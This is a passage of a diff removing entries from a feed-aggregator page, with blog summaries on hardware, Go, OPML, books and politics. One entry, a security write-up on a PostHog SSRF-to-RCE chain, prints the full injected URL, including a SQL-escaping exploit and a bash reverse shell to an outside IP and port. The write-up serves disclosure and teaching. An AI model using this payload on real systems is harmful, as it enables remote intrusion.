href="http://seizethemeansofcomputation.org">http://seizethemeansofcomputation.org</a>). Signed copies at Book Soup (<a href="https://www.booksoup.com/book/9781804291245)">https://www.booksoup.com/book/9781804291245)</a>. &quot;Red Team Blues&quot;: &quot;A grabby, compulsive thriller that will leave you knowing more about how the world works than you did before.&quot; Tor Books <a href="http://redteamblues.com">http://redteamblues.com</a>. &quot;Chokepoint Capitalism: How to Beat Big Tech, Tame Big Content, and Get Artists Paid, with Rebecca Giblin&quot;, on how to unrig the markets for creative labor, Beacon Press/Scribe 2022 <a href="https://chokepointcapitalism.com">https://chokepointcapitalism.com</a> Upcoming books (permalink) &quot;Unauthorized Bread&quot;: a middle-grades graphic novel adapted from my novella about refugees, toasters and DRM, FirstSecond, 2026 &quot;Enshittification, Why Everything Suddenly Got Worse and What to Do About It&quot; (the graphic novel), Firstsecond, 2026 &quot;The Memex Method,&quot; Farrar, Straus, Giroux, 2026 &quot;The Reverse-Centaur's Guide to AI,&quot; a short book about being a better AI critic, Farrar, Straus and Giroux, June 2026 Colophon (permalink) Today's top sources: John Naughton (<a href="https://memex.naughtons.org/)">https://memex.naughtons.org/)</a>. Currently writing: &quot;The Reverse Centaur's Guide to AI,&quot; a short book for Farrar, Straus and Giroux about being an effective AI critic. LEGAL REVIEW AND COPYEDIT COMPLETE. &quot;The Post-American Internet,&quot; a short book about internet policy in the age of Trumpism. PLANNING. A Little Brother short story about DIY insulin PLANNING This work – excluding any serialized fiction – is licensed under a Creative Commons Attribution 4.0 license. That means you can use it any way you like, including commercially, provided that you attribute it to me, Cory Doctorow, and include a link to pluralistic.net. <a href="https://creativecommons.org/licenses/by/4.0/">https://creativecommons.org/licenses/by/4.0/</a> Quotations and images are not included in this license; they are included either under a limitation or exception to copyright, or on the basis of a separate license. Please exercise caution. How to get Pluralistic: Blog (no ads, tracking, or data-collection): Pluralistic.net Newsletter (no ads, tracking, or data-collection): <a href="https://pluralistic.net/plura-list">https://pluralistic.net/plura-list</a> Mastodon (no ads, tracking, or data-collection): <a href="https://mamot.fr/@pluralistic">https://mamot.fr/@pluralistic</a> Medium (no ads, paywalled): <a href="https://doctorow.medium.com/">https://doctorow.medium.com/</a> Twitter (mass-scale, unrestricted, third-party surveillance and advertising): <a href="https://twitter.com/doctorow">https://twitter.com/doctorow</a> Tumblr (mass-scale, unrestricted, third-party surveillance and advertising): <a href="https://mostlysignssomeportents.tumblr.com/tagged/pluralistic">https://mostlysignssomeportents.tumblr.com/tagged/pluralistic</a> &quot;When life gives you SARS, you make sarsaparilla&quot; -Joey &quot;Accordion Guy&quot; DeVilla READ CAREFULLY: By reading this, you agree, on behalf of your employer, to release me from all obligations and waivers arising from any and all NON-NEGOTIATED agreements, licenses, terms-of-service, shrinkwrap, clickwrap, browsewrap, confidentiality, non-disclosure, non-compete and acceptable use policies (&quot;BOGUS AGREEMENTS&quot;) that I have entered into with your employer, its partners, licensors, agents and assigns, in perpetuity, without prejudice to my ongoing rights and privileges. You further represent that you have the authority to release me from any BOGUS AGREEMENTS on behalf of your employer. ISSN: 3066-764X</p>
-
-      <address>
-        <a href="https://pluralistic.net/2025/12/18/self-licking-ice-cream-cone/">https://pluralistic.net/2025/12/18/self-licking-ice-cream-cone/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T14:30:00Z" data-link="https://antonz.org/detecting-goroutine-leaks/">
-      <h1>Detecting goroutine leaks with synctest/pprof</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Explore different types of leaks and how to detect them in modern Go versions.</p>
-
-      <address>
-        <a href="https://antonz.org/detecting-goroutine-leaks/">https://antonz.org/detecting-goroutine-leaks/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T14:00:33Z" data-link="https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5">
-      <h1>1.5 TB of VRAM on Mac Studio - RDMA over Thunderbolt 5</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>1.5 TB of VRAM on Mac Studio - RDMA over Thunderbolt 5</p>
-<p><img src="https://www.jeffgeerling.com/sites/default/files/images/mac-studio-cluster-1-hero.jpg" alt="Mac Studio Cluster"></p>
-<p>Apple gave me access to this Mac Studio cluster to test RDMA over Thunderbolt, a <a href="https://developer.apple.com/documentation/macos-release-notes/macos-26_2-release-notes#RDMA-over-Thunderbolt">new feature in macOS 26.2</a>. The easiest way to test it is with <a href="https://exolabs.net">Exo 1.0</a>, an open source private AI clustering tool. RDMA lets the Macs all act like they have one giant pool of RAM, which speeds up things like massive AI models.</p>
-<p>Jeff GeerlingDecember 18, 2025</p>
-
-      <address>
-        <a href="https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5">https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T14:00:33Z" data-link="https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5/">
-      <h1>1.5 TB of VRAM on Mac Studio - RDMA over Thunderbolt 5</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p><img src="https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5/mac-studio-cluster-1-hero.jpg" alt="Mac Studio Cluster"></p>
-<p>Apple gave me access to this Mac Studio cluster to test RDMA over Thunderbolt, a <a href="https://developer.apple.com/documentation/macos-release-notes/macos-26_2-release-notes#RDMA-over-Thunderbolt">new feature in macOS 26.2</a>. The easiest way to test it is with <a href="https://exolabs.net">Exo 1.0</a>, an open source private AI clustering tool. RDMA lets the Macs all act like they have one giant pool of RAM, which speeds up things like massive AI models.</p>
-<p>The stack of Macs I tested, with 1.5 TB of unified memory, costs just shy of $40,000, and if you're wondering, no I cannot justify spending that much money for this. Apple loaned the Mac Studios for testing. I also have to thank DeskPi for sending over the 4-post mini rack containing the cluster.</p>
-
-      <address>
-        <a href="https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5/">https://www.jeffgeerling.com/blog/2025/15-tb-vram-on-mac-studio-rdma-over-thunderbolt-5/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T13:58:04Z" data-link="https://mastodon.social/@Migueldeicaza/115740920002018712">
-      <h1>@Miguel de Icaza Mastondon feed</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Wow!</p>
-<p>The first SwiftGodot-based game is on the AppStore:</p>
-<p><a href="https://apps.apple.com/us/app/terminal-madness-revelations/id6740811766">https://apps.apple.com/us/app/terminal-madness-revelations/id6740811766</a></p>
-
-      <address>
-        <a href="https://mastodon.social/@Migueldeicaza/115740920002018712">https://mastodon.social/@Migueldeicaza/115740920002018712</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T13:57:54Z" data-link="https://justdario.com/2025/12/the-risk-of-a-silver-chaos/">
-      <h1>THE RISK OF A SILVER CHAOS</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>There is a scenario every trader fears: when your screens go dark. In that situation, the only way to understand where the market is trading is to start making phone calls to your trading partners. To a certain extent, this event already happened during Thanksgiving night when CME servers stopped...</p>
-<p>The post <a href="https://justdario.com/2025/12/the-risk-of-a-silver-chaos/">THE RISK OF A SILVER CHAOS</a> appeared first on <a href="https://justdario.com">JustDario</a>.</p>
-
-      <address>
-        <a href="https://justdario.com/2025/12/the-risk-of-a-silver-chaos/">https://justdario.com/2025/12/the-risk-of-a-silver-chaos/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T13:56:13Z" data-link="http://scripting.com/2025/12/18/135613.html?title=inoreaderAndDynamicOpml">
-      <h1>Inoreader and dynamic OPML</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p><em>This post was updated thanks to <a href="https://github.com/scripting/Scripting-News/issues/348#issuecomment-3672110696">help</a> from Andrew Shell.</em></p>
-<p>I have a free account at <a href="https://www.inoreader.com/">Inoreader</a>. I was reminded today that they support dynamic OPML subscription lists, and decided to give it a try.</p>
-<p>You can <a href="https://www.inoreader.com/opml_subscriptions">subscribe</a> to an OPML subscription list. Exactly the same format we used for importing lists. This means I can use the same feed list in two readers. Or I could share my list with everyone who subscribes to my newsletter. I can update the list, and the flow of news to the subscribers changes too.</p>
-<p>I tried subscribing to my <a href="https://feedland.social/opml?screenname=davewiner&amp;catname=podcasts">podcast list</a> in Inoreader.</p>
-<ol>
-<li>Put the URL to my podcast list on the clipboard.</li>
-<li>Go to <a href="https://www.inoreader.com/opml_subscriptions">this page</a> on the Inoreader site.</li>
-<li>Click the big blue Subscribe to OPML button.</li>
-<li>Paste the URL from the first step into the dialog.</li>
-<li>Enter a folder name and description.</li>
-<li>For synchronization I recommend the second option, full synchronization.</li>
-<li>Then click Save, and if it worked, you should see the OPML file in a list.</li>
-</ol>
-<p>It <a href="https://imgs.scripting.com/2025/12/18/inoreaderList.png">worked</a>. I now can see my podcast updates in Inoreader, exactly as if it was in FeedLand.</p>
-<p>And when I add new feeds they show up over there, same when I remove.</p>
-<p>It'll be very interesting to see how it changes over time. I'll let you know! ;-)</p>
-<p><strong>Links</strong></p>
-<ul>
-<li><a href="https://this.how/podcasting/">Listening lists</a>, as a feature for podcasts.</li>
-<li>This is <a href="https://lists.opml.org/">where</a> I was accumulating short URLs for subscription lists. Started it in Sept. The <a href="https://lists.opml.org/daveblogroll.xml">short URL</a> for the blogroll.</li>
-</ul>
-
-      <address>
-        <a href="http://scripting.com/2025/12/18/135613.html?title=inoreaderAndDynamicOpml">http://scripting.com/2025/12/18/135613.html?title=inoreaderAndDynamicOpml</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T13:38:49Z" data-link="https://werd.io/the-go-no-go-date/">
-      <h1>The Go/No Go Date</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>&quot;Feeling fear goes hand-in-hand with being ambitious. Imposter syndrome is real and normal. In fact, if you aren't feeling fear in what you do, I'd argue that you aren't being ambitious enough.&quot; Here's a way to build in the fear and do it anyway.</p>
-
-      <address>
-        <a href="https://werd.io/the-go-no-go-date/">https://werd.io/the-go-no-go-date/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T12:44:21Z" data-link="https://news.lettersofnote.com/p/what-do-i-want-for-christmas">
-      <h1>What do I want for Christmas?</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Letters of Noël</p>
-
-      <address>
-        <a href="https://news.lettersofnote.com/p/what-do-i-want-for-christmas">https://news.lettersofnote.com/p/what-do-i-want-for-christmas</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T12:30:57Z" data-link="https://www.gelliottmorris.com/p/what-do-you-want-to-ask-in-our-2026">
-      <h1>Add your own questions to our 2026 election polls!</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Strength In Numbers is planning to go big on interactive polling and modeling in 2026. Help us decide what questions to track on a monthly basis</p>
-
-      <address>
-        <a href="https://www.gelliottmorris.com/p/what-do-you-want-to-ask-in-our-2026">https://www.gelliottmorris.com/p/what-do-you-want-to-ask-in-our-2026</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T12:03:14Z" data-link="https://www.borowitzreport.com/p/a-holiday-gift-from-me-to-you">
-      <h1>A Holiday Gift from Me to You!</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Happy Holidays from TBR</p>
-
-      <address>
-        <a href="https://www.borowitzreport.com/p/a-holiday-gift-from-me-to-you">https://www.borowitzreport.com/p/a-holiday-gift-from-me-to-you</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T11:39:49Z" data-link="https://adactio.com/notes/22311">
-      <h1>> Tradition is not the worship of ashes, but the preservation of fire.</h1>
-
-(date: 2025-12-18)
-      <p>
-      <blockquote>
-<p>Tradition is not the worship of ashes, but the preservation of fire.</p>
-</blockquote>
-
-      <address>
-        <a href="https://adactio.com/notes/22311">https://adactio.com/notes/22311</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T11:30:54Z" data-link="https://paulkrugman.substack.com/p/why-trumps-viciousness-matters">
-      <h1>Why Trump’s Viciousness Matters</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>He wants to destroy our values, not just our democracy</p>
-
-      <address>
-        <a href="https://paulkrugman.substack.com/p/why-trumps-viciousness-matters">https://paulkrugman.substack.com/p/why-trumps-viciousness-matters</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T11:30:17Z" data-link="https://lithub.com/lit-hub-daily-december-18-2025/">
-      <h1>Lit Hub Daily: December 18, 2025</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>We’re proud of everything we publish, but we all have our favorites. These are the Lit Hub stories our staff loved in 2025. | Lit Hub Sandy Ernest Allen reckons with Harry Potter as a trans person: “I’d often look</p>
-
-      <address>
-        <a href="https://lithub.com/lit-hub-daily-december-18-2025/">https://lithub.com/lit-hub-daily-december-18-2025/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T10:25:15Z" data-link="https://sightlessscribbles.com/the-colonization-of-confidence/">
-      <h1>The Colonization of Confidence., Sightless Scribbles</h1>
-
-(date: 2025-12-18)
-      <p>
-      <blockquote>
-<p>I love the small web, the clean web. I hate tech bloat.</p>
-<p>And LLMs are the ultimate bloat.</p>
-</blockquote>
-<p>So much truth in one story:</p>
-<blockquote>
-<p>They built a machine to gentrify the English language.</p>
-<p>They have built a machine that weaponizes mediocrity and sells it as perfection.</p>
-<p>They are strip-mining your confidence to sell you back a synthetic version of it.</p>
-</blockquote>
-<p><a href="https://adactio.com/links/22310">adactio.com/links/22310</a></p>
-
-      <address>
-        <a href="https://sightlessscribbles.com/the-colonization-of-confidence/">https://sightlessscribbles.com/the-colonization-of-confidence/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T10:06:58Z" data-link="https://xn--gckvb8fzb.com/the-mysterious-forces-steering-views-on-hacker-news/">
-      <h1>The Mysterious Forces Steering Views on Hacker News</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>How the moderators behind one of the internet's most popular platforms for
-tech content have a say into which content you consume.</p>
-
-      <address>
-        <a href="https://xn--gckvb8fzb.com/the-mysterious-forces-steering-views-on-hacker-news/">https://xn--gckvb8fzb.com/the-mysterious-forces-steering-views-on-hacker-news/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T10:00:00Z" data-link="https://openchannels.fm/delivering-customer-value-through-collaborative-ecosystem-partnerships/">
-      <h1>Delivering Customer Value Through Collaborative Ecosystem Partnerships</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>In this podcast, Jonathan chats with Sandra from Greyd and Tim from BigScoots about forming strong partnerships in WordPress. They share tips on success, collaboration, and maintaining relationships.</p>
-
-      <address>
-        <a href="https://openchannels.fm/delivering-customer-value-through-collaborative-ecosystem-partnerships/">https://openchannels.fm/delivering-customer-value-through-collaborative-ecosystem-partnerships/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T09:59:50Z" data-link="https://lithub.com/the-10-best-book-reviews-of-2025/">
-      <h1>The 10 Best Book Reviews of 2025</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>While researching the Little Review archives for my book, A Danger to the Minds of Young Girls, I stumbled across an all-time banger of an opening line in Jane Heap’s review of Sherwood Anderson’s Windy McPherson’s Son: “Here is another</p>
-
-      <address>
-        <a href="https://lithub.com/the-10-best-book-reviews-of-2025/">https://lithub.com/the-10-best-book-reviews-of-2025/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T09:59:38Z" data-link="https://lithub.com/am-i-the-asshole-for-calling-out-romance-novelists-who-dont-actually-care-about-romance/">
-      <h1>Am I the Asshole For Calling Out Romance Novelists Who Don’t Actually Care About Romance?</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Hello, hello! Welcome back to another thrilling installment of everyone’s favorite advice column, Am I the Literary Asshole?, a place where you can have a beer along with a tasty side of literary gossip. I’m your host, Kristen Arnett, and</p>
-
-      <address>
-        <a href="https://lithub.com/am-i-the-asshole-for-calling-out-romance-novelists-who-dont-actually-care-about-romance/">https://lithub.com/am-i-the-asshole-for-calling-out-romance-novelists-who-dont-actually-care-about-romance/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T09:59:20Z" data-link="https://lithub.com/burn-harry-burn-reckoning-with-my-harry-potter-fandom-as-a-trans-person/">
-      <h1>Burn Harry Burn: Reckoning With My Harry Potter Fandom as a Trans Person</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>During the spring of 2020, as the world locked down and people were dead and dying and breaking apart and mourning and afraid and hiding, the British author J.K. Rowling decided to publish an open letter about trans people. In</p>
-
-      <address>
-        <a href="https://lithub.com/burn-harry-burn-reckoning-with-my-harry-potter-fandom-as-a-trans-person/">https://lithub.com/burn-harry-burn-reckoning-with-my-harry-potter-fandom-as-a-trans-person/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T09:59:03Z" data-link="https://lithub.com/on-the-past-and-present-of-authoritarianism-war-and-literature-in-europe/">
-      <h1>On the Past and Present of Authoritarianism, War, and Literature in Europe</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>From the World Wars to today’s Russian invasion of Ukraine, conflict has shaped Europe’s cultures, politics, and language. Author Artem Chapeye (Ukraine), Peter Osnos (Poland) and Antonia Lloyd-Jones (Poland) explore how war transforms personal destinies and collective memory through their novels and memoirs. This transcript has</p>
-
-      <address>
-        <a href="https://lithub.com/on-the-past-and-present-of-authoritarianism-war-and-literature-in-europe/">https://lithub.com/on-the-past-and-present-of-authoritarianism-war-and-literature-in-europe/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T09:58:15Z" data-link="https://lithub.com/hitler-and-my-mother-in-law-and-the-slippery-terrain-of-truth/">
-      <h1>Hitler and My Mother-In-Law (and the Slippery Terrain of Truth)</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>The first time I met my mother-in-law, Patricia Hartwell, she displayed her World War II trophies, the highlights being Hermann Goering’s medals and his tiny Minox camera, Goebbel’s silverware, a couple of scary-looking Lugers, Hitler’s napkins, and blank orders he’d</p>
-
-      <address>
-        <a href="https://lithub.com/hitler-and-my-mother-in-law-and-the-slippery-terrain-of-truth/">https://lithub.com/hitler-and-my-mother-in-law-and-the-slippery-terrain-of-truth/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T09:02:02Z" data-link="https://robertreich.substack.com/p/the-real-threat-of-trumps-madness">
-      <h1>The real threat in Trump’s madness </h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>I hate to say this, but it must be faced</p>
-
-      <address>
-        <a href="https://robertreich.substack.com/p/the-real-threat-of-trumps-madness">https://robertreich.substack.com/p/the-real-threat-of-trumps-madness</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T09:01:27Z" data-link="https://lithub.com/elizabeth-mccracken-on-writing-about-writing-at-last/">
-      <h1>Elizabeth McCracken on Writing About Writing, At Last</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Acclaimed fiction writer and long-time creative writing professor Elizabeth McCracken joins co-hosts Whitney Terrell and V. V. Ganeshananthan to discuss her ninth book and first volume about craft, A Long Game: Notes on Writing Fiction. McCracken reflects on her long-held</p>
-
-      <address>
-        <a href="https://lithub.com/elizabeth-mccracken-on-writing-about-writing-at-last/">https://lithub.com/elizabeth-mccracken-on-writing-about-writing-at-last/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T08:31:41Z" data-link="http://scripting.com/2025/12/17/151853.html">
-      <h1>@Dave Winer's linkblog</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Scripting News: Why humans should have an exclusive on being human.</p>
-
-      <address>
-        <a href="http://scripting.com/2025/12/17/151853.html">http://scripting.com/2025/12/17/151853.html</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T07:15:57Z" data-link="https://www.raspberrypi.com/news/amstrad-ppc-640-cyberdeck-gets-a-raspberry-pi-makeover/">
-      <h1>Amstrad PPC 640 cyberdeck gets a Raspberry Pi makeover</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Amstrad’s first portable IBM PC compatible computer was transformed into a cool-looking cyberdeck powered by Raspberry Pi 4.</p>
-<p>The post <a href="https://www.raspberrypi.com/news/amstrad-ppc-640-cyberdeck-gets-a-raspberry-pi-makeover/">Amstrad PPC 640 cyberdeck gets a Raspberry Pi makeover</a> appeared first on <a href="https://www.raspberrypi.com">Raspberry Pi</a>.</p>
-
-      <address>
-        <a href="https://www.raspberrypi.com/news/amstrad-ppc-640-cyberdeck-gets-a-raspberry-pi-makeover/">https://www.raspberrypi.com/news/amstrad-ppc-640-cyberdeck-gets-a-raspberry-pi-makeover/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T06:45:49Z" data-link="https://heathercoxrichardson.substack.com/p/december-17-2025">
-      <h1>December 17, 2025 </h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>This morning, four vulnerable Republicans signed onto the discharge petition all House Democrats have signed to force Speaker Mike Johnson (R-LA) to bring a bill to extend the premium tax credits for purchasing healthcare insurance on the Affordable Care Act (ACA) markets to the floor for a vote.</p>
-
-      <address>
-        <a href="https://heathercoxrichardson.substack.com/p/december-17-2025">https://heathercoxrichardson.substack.com/p/december-17-2025</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T03:35:06Z" data-link="https://mastodon.social/@Migueldeicaza/115738470409525211">
-      <h1>@Miguel de Icaza Mastondon feed</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Brad Pitt’s F1 movie had me glued to my seat. I could use more of this.</p>
-
-      <address>
-        <a href="https://mastodon.social/@Migueldeicaza/115738470409525211">https://mastodon.social/@Migueldeicaza/115738470409525211</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T01:42:22Z" data-link="https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything">
-      <h1>Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p><strong><a href="https://mdisec.com/inside-posthog-how-ssrf-a-clickhouse-sql-escaping-0day-and-default-postgresql-credentials-formed-an-rce-chain-zdi-25-099-zdi-25-097-zdi-25-096/">Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain</a></strong></p>
-<p>Mehmet Ince describes a very elegant chain of attacks against the PostHog analytics platform, combining several different vulnerabilities (now all reported and fixed) to achieve RCE - Remote Code Execution - against an internal PostgreSQL server.</p>
-<p>The way in abuses a webhooks system with non-robust URL validation, setting up a SSRF (Server-Side Request Forgery) attack where the server makes a request against an internal network resource.</p>
-<p>Here's the URL that gets injected:</p>
-<p><code>http://clickhouse:8123/?query=SELECT++FROM+postgresql('db:5432','posthog',\&quot;posthog_use'))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\&quot;bash+-i+&gt;%26+/dev/tcp/172.31.221.180/4444+0&gt;%261\\&quot;$$;SELECT++FROM+cmd_exec;+--\&quot;,'posthog','posthog')#</code></p>
-<p>Reformatted a little for readability:</p>
-<pre><code>http://clickhouse:8123/?query=
-SELECT *
-FROM postgresql(
-    'db:5432',
-    'posthog',
-    &quot;posthog_use')) TO STDOUT;
-    END;
-    DROP TABLE IF EXISTS cmd_exec;
-    CREATE TABLE cmd_exec (
-        cmd_output text
-    );
-    COPY cmd_exec
-    FROM PROGRAM $$
-        bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.31.221.180/4444 0&gt;&amp;1\&quot;
-    $$;
-    SELECT * FROM cmd_exec;
-    --&quot;,
-    'posthog',
-    'posthog'
-)
-#
-
-</code></pre>
-<p>This abuses ClickHouse's ability to <a href="https://clickhouse.com/docs/sql-reference/table-functions/postgresql#implementation-details">run its own queries against PostgreSQL</a> using the <code>postgresql()</code> table function, combined with an escaping bug in ClickHouse PostgreSQL function ( <a href="https://github.com/ClickHouse/ClickHouse/pull/74144">since fixed</a>). Then <em>that</em> query abuses PostgreSQL's ability to run shell commands via <code>COPY ... FROM PROGRAM</code>.</p>
-<p>The <code>bash -c</code> bit is particularly nasty - it opens a reverse shell such that an attacker with a machine at that IP address listening on port 4444 will receive a connection from the PostgreSQL server that can then be used to execute arbitrary commands.</p>
-<p>Via <a href="https://news.ycombinator.com/item?id=46305321">Hacker News</a></p>
-<p>Tags: <a href="https://simonwillison.net/tags/postgresql">postgresql</a>, <a href="https://simonwillison.net/tags/security">security</a>, <a href="https://simonwillison.net/tags/sql">sql</a>, <a href="https://simonwillison.net/tags/sql-injection">sql-injection</a>, <a href="https://simonwillison.net/tags/webhooks">webhooks</a>, <a href="https://simonwillison.net/tags/clickhouse">clickhouse</a></p>
-
-      <address>
-        <a href="https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything">https://simonwillison.net/2025/Dec/18/ssrf-clickhouse-postgresql/#atom-everything</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T00:05:00Z" data-link="https://therestishistory.com/627-jack-the-ripper-from-hell-part-4/">
-      <h1>627. Jack The Ripper: From Hell (Part 4)</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Why was Jack the Ripper’s final murder the most appalling of all? Who was the mysterious Mary-Jane Kelly, his unfortunate victim? And, what enduring impact would his crimes have upon the cultural climate of England, and the treatment of women? Join Tom and Dominic as they reach the nightmarish crescendo of Victorian London’s darkest days, […]</p>
-<p>The post <a href="https://therestishistory.com/627-jack-the-ripper-from-hell-part-4/">627. Jack The Ripper: From Hell (Part 4)</a> appeared first on <a href="https://therestishistory.com">The Rest is History</a>.</p>
-
-      <address>
-        <a href="https://therestishistory.com/627-jack-the-ripper-from-hell-part-4/">https://therestishistory.com/627-jack-the-ripper-from-hell-part-4/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T00:00:00Z" data-link="https://webrecorder.net/blog/2025-12-18-conifer-twilight/">
-      <h1>Our statement on Conifer sunset announcement</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>Some thoughts on the Conifer sunset.</p>
-
-      <address>
-        <a href="https://webrecorder.net/blog/2025-12-18-conifer-twilight/">https://webrecorder.net/blog/2025-12-18-conifer-twilight/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T00:00:00Z" data-link="https://webrecorder.net/blog/2025-12-18-browsertrix-1-21/">
-      <h1>Execution Time Addons, Robots.txt, Profile Refreshes, Custom Schedules, and More</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>An overview of exciting new features from Browsertrix 1.19, 1.20, and 1.21.</p>
-
-      <address>
-        <a href="https://webrecorder.net/blog/2025-12-18-browsertrix-1-21/">https://webrecorder.net/blog/2025-12-18-browsertrix-1-21/</a>
-      </address>
-    </article>
-
-    <article data-published="2025-12-18T00:00:00Z" data-link="https://buttondown.com/blog/2025-12-18-more-locale-options">
-      <h1>More locale options</h1>
-
-(date: 2025-12-18)
-      <p>
-      <p>New English locale variants for UK, Australia, and Canada.</p>
-
-      <address>
-        <a href="https://buttondown.com/blog/2025-12-18-more-locale-options">https://buttondown.com/blog/2025-12-18-more-locale-options</a>
       </address>
     </article>
   </section>
